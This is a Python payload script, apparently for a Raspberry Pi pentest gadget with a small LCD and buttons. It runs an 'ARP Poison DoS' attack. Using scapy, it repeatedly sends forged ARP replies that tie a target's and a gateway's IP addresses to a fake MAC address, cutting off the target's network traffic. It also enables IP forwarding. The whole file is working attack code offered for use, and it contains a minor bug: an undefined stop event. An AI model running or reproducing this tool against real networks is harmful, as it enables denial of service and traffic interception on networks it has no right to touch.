#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import raspyjack_integration as rji
from scapy.all import *
conf.verb = 0

TARGET_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"
FAKE_MAC = "00:11:22:33:44:55"

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
status_msg = "Press OK to start"
current_ip_input = ""
ip_input_cursor_pos = 0
current_ip_type = ""
ATTACK_INTERFACE = None

def cleanup(*_):
    global running, ATTACK_INTERFACE
    running = False
    if ATTACK_INTERFACE:
        restore_arp_tables(ATTACK_INTERFACE)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "ARP Poison DoS", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Gateway IP:", font=FONT, fill="white")
        d.text((5, 80), GATEWAY_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "select_ip_type":
        d.text((5, 40), "Select IP to Edit:", font=FONT, fill="white")
        d.text((5, 60), "KEY1: Target IP", font=FONT, fill="yellow")
        d.text((5, 75), "KEY2: Gateway IP", font=FONT, fill="yellow")
        d.text((5, 115), "KEY3=Back", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), f"Enter {current_ip_type} IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 40), "ARP Poisoning...", font=FONT_TITLE, fill="red")
        d.text((5, 60), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 75), f"Gateway: {GATEWAY_IP}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return None

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}", file=sys.stderr)
    return None

def restore_arp_tables(interface):
    global TARGET_IP, GATEWAY_IP
    if not TARGET_IP or not GATEWAY_IP:
        return
    
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)
    
    if target_mac and gateway_mac:
        print(f"Restoring ARP tables for {TARGET_IP} and {GATEWAY_IP}...", file=sys.stderr)
        send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac), iface=interface, verbose=0)
        send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac), iface=interface, verbose=0)
        print("ARP tables restored.", file=sys.stderr)
    else:
        print("Could not restore ARP tables (MACs not found).", file=sys.stderr)

def arp_poison_worker(target_ip, gateway_ip, interface):
    global attack_thread
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"Could not get MAC for target {target_ip}", file=sys.stderr)
        return
    if not gateway_mac:
        print(f"Could not get MAC for gateway {gateway_ip}", file=sys.stderr)
        return
    
    print(f"Starting ARP poisoning: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac}) on {interface}", file=sys.stderr)
    
    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=FAKE_MAC)
    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=FAKE_MAC)
    
    while running:
        send(packet1, iface=interface, verbose=0)
        send(packet2, iface=interface, verbose=0)
        time.sleep(2)

def run_attack():
    global status_msg, attack_thread, TARGET_IP, GATEWAY_IP, ATTACK_INTERFACE
    
    interface = rji.get_best_interface()
    if not interface:
        status_msg = "No active network\ninterface found!"
        return False
    
    ATTACK_INTERFACE = interface
    
    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, check=True, capture_output=True)
    
    status_msg = "Starting attack..."
    attack_thread = threading.Thread(target=arp_poison_worker, args=(TARGET_IP, GATEWAY_IP, interface), daemon=True)
    attack_thread.start()
    return True

if __name__ == "__main__":
    try:
        current_screen = "main"

        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    if run_attack():
                        current_screen = "attacking"
                    time.sleep(0.3)
                
                if GPIO.input(PINS["KEY1"]) == 0:
                    current_ip_type = "target"
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(0.3)
                
                if GPIO.input(PINS["KEY2"]) == 0:
                    current_ip_type = "gateway"
                    current_ip_input = GATEWAY_IP
                    current_screen = "ip_input"
                    time.sleep(0.3)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    if current_ip_type == "target":
                        TARGET_IP = new_ip
                    elif current_ip_type == "gateway":
                        GATEWAY_IP = new_ip
                current_screen = "main"
                time.sleep(0.3)
            
            elif current_screen == "attacking":
                draw_ui("attacking")
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                time.sleep(0.1)

            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("ARP Poison DoS payload finished.")